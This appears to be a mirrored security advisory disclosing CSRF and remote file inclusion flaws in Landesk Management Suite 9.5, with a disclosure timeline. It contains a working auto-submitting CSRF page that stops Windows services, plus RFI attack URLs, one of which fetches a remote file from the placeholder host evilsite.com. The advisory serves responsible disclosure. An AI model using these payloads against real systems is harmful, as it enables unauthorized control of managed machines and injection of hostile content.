@@ -1,0 +1,125 @@
+id: 23535
+date: 04/19/2015
+title: Landesk Management Suite 9.5 RFI / CSRF Vulnerabilities
+author: Alex Haynes
+cves: CVE-2014-5361, CVE-2014-5362
+
+Exploit Title: Landesk Management Suite RFI and CSRF vulnerabilities
+Product: Landesk Management Suite
+Vulnerable Versions: 9.5 (and possible previous versions), 9.6
+Tested Version: 9.5
+Advisory Publication: 16/04/2015
+Latest Update: 16/04/2015
+Vulnerability Type: Cross-site request forgery [CWE-352], Remote File Inclusion [CWE-829]
+CVE Reference: CVE-2014-5361, CVE-2014-5362
+Credit: Alex Haynes
+
+Advisory Details:
+
+
+(1) Vendor & Product Description
+--------------------------------
+
+Vendor:
+LANDESK
+
+Product & Version:
+Landesk Management Suite v9.5
+
+Vendor URL & Download:
+http://www.landesk.com/products/management-suite/
+
+Product Description:
+"Manage all your users’ multi-platform desktops and mobile devices. Integrate several IT disciplines
+into a single management experience that speeds software distribution, ensures software license compliance,
+simplifies OS provisioning, saves power costs, provides secure remote control, and manages Mac OS X."
+
+
+(2) Vulnerability Details:
+--------------------------
+The admin interface of Landesk Management Suite can be exploited by Remote File Inclusion (RFI) and Cross-site Request forgery (CSRF) attacks.
+
+Proof of concept for CSRF [CVE-2014-5361]:
+-----------------------------------------
+URL: https://<LANDESK>/remote/serverServices.aspx?cidn=5&d=serverServices&tb=serverInfo_services.tb&gid=groupSW_Services&itemid=SW_Services&UID=SW_Services_SW_ROOT
+Attack Pattern: 
+
+Certain functionalities of landesk are vulnerable to cross-site request forgeries, which can be used to force users to, among other things,
+manipulate windows services and processes on  host machines. 
+
+Example code below:
+<!-- CSRF for Landesk, allowing stop, start or restart of arbitrary services OR processes on host machine -->
+<html>
+<head>
+<script>
+<!-- For illustration only, Skype and Adobe Acrobat Update Services are shut down / Replace with any windows service on host machine -->
+window.onload = function() {
+  document.getElementById("csrfForm1").submit();
+  document.getElementById("csrfForm2").submit();
+  }
+
+</script>
+</head>
+<body>
+<form id="csrfForm1" action="https://landesk/remote/serverServices.aspx?cidn=5&d=serverServices&tb=serverInfo_services.tb&gid=groupSW_Services&itemid=SW_Services&UID=SW_Services_SW_ROOT" method="POST" enctype="multipart/form-data" target="csrfIframe1">
+      <input type="hidden" name="op" value="stop" />
+      <input type="hidden" name="name" value="Adobe Acrobat Update Service" />
+</form>
+
+<form id="csrfForm2" action="https://landesk/remote/serverServices.aspx?cidn=5&d=serverServices&tb=serverInfo_services.tb&gid=groupSW_Services&itemid=SW_Services&UID=SW_Services_SW_ROOT" method="POST" enctype="multipart/form-data" target="csrfIframe2">
+      <input type="hidden" name="op" value="stop" />
+      <input type="hidden" name="name" value="Skype Updater" />
+</form>
+
+<iframe style="display:hidden" height="0" width="0" frameborder="0" name"csrfIframe1"></iframe>    
+<iframe style="display:hidden" height="0" width="0" frameborder="0" name"csrfIframe2"></iframe>
+</body>
+</html>
+
+
+Proof of concept for RFI [CVE-2014-5362]:
+-----------------------------------------
+
+There are numerous URLs within the landesk management suite that can be used to call upon remote files due to the use of relative paths.
+This can be leveraged to introduce remote file inclusion vulnerabilities as you can present external content through the landesk server.
+
+URLs:
+https://<LANDESK>/ldms/sm_actionfrm.asp?cmd=dir&ht=1&d=//<RFI here>
+https://<LANDESK>/remote/frm_coremainfrm.aspx?tb=cust_qry.tb&d=//<RFI here>&bfn=swd_top&node=4&baseType=group1&groupID=1646&groupType=null&ownerID=56
+https://<LANDESK>/remote/frm_splitfrm.aspx?top=//<RFI here>&ttb=dirman.tb&ftr=frm_tasktabsfrm&tabf=dirman_tabs&tf=dirman_top&bottom=frm_taskfrm&bbd=SoftwareDistribution/ldaplist&bf=dirlist_bottom&bd=frm_coremainfrm&btb=dirlist.tb&pct=50
+
+Parameter names: "d" & "top"
+Parameter Type: GET
+Attack Pattern:
+The Remote File must finish in .aspx but the extension is not referenced explicitly in the URL. It will be fetched in HTTPS.
+d=//<any external URL here>/<filenamehere>(.aspx)
+example:
+https://<LANDESK>/ldms/sm_actionfrm.asp?cmd=dir&ht=1&d=//evilsite.com/myevilaspxfile
+
+
+(3) Advisory Timeline:
+----------------------
+15/09/2014 - First Contact
+23/10/2014 - Request for update on fix. No ETA given.
+21/11/2014 - Request for update on fix. No ETA given.
+22/12/2014 - Request for update on fix. No ETA given.
+22/01/2015 - Request for update on fix. No ETA given.
+13/04/2015 - Final request for update and notice of public disclosure given. No ETA for fix.
+16/04/2015 - Public disclosure
+
+(4)Solution:
+------------
+No fix at this time.
+
+
+(5) Credits:
+------------
+Discovered by Alex Haynes
+
+References:
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5361
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5362
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-5361
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-5362
+
+#  0day.today [2023-03-23]  #
